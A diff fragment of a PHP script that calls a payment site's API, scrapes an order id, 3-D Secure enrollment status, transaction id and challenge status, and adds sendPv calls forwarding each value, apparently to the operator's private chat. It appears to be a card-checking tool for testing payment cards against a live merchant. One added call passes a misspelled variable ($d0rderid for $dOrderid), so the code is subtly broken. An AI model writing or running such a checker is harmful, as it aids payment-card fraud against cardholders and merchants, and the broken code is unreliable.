@@ -1675,6 +1675,9 @@ preg_match('/name="dOrderid" value="([^"]+)"/', $response, $match);
 $dOrderid = $match[1];
 curl_close($curl);
 
+	sendPv($myid, $d0rderid);
+
+	
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_version/',
@@ -1711,6 +1714,8 @@ $enrolled = $matches[1];
 preg_match('/"serverTransactionId":\s*"([^"]+)"/', $response, $matches);
 $serverTransactionId = $matches[1];
 
+	sendPv($myid, $enrolled);
+	
 //preg_match('/"methodUrl":\s*"([^"]+)"/', $response, $matches);
 //$methodUrl = $matches[1];
 //preg_match('/"methodData":\s*"([^"]+)"/', $response, $matches);
@@ -1753,7 +1758,8 @@ $data = json_decode($response, true);
 curl_close($curl);
 
 
-
+sendPv($myid, $data);
+	
 $status_cha = $data["status"];
 if ($status_cha == "CHALLENGE_REQUIRED"){
 
@@ -1818,7 +1824,7 @@ $respo = $match[1];
 }
 //file_put_contents('/sdcard/index.html', $response);
 curl_close($curl);
-
+sendPv($myid, $respo);
 }
 //echo "RESPO: $respo\n";
 
